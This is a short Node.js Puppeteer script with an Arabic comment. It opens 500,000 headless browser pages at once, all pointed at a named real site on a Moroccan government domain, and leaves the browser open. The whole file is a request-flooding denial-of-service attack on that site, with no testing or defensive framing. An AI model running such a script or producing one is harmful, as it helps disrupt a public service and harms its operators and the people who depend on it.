const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const promises = [];

  for (let i = 0; i < 500000; i++) {
    promises.push(browser.newPage().then(async (page) => {
      await page.goto('https://massar.men.gov.ma');
    }));
  }

  await Promise.all(promises);

  // await browser.close(); // تعليق هذا السطر لعدم غلق المتصفح
})();
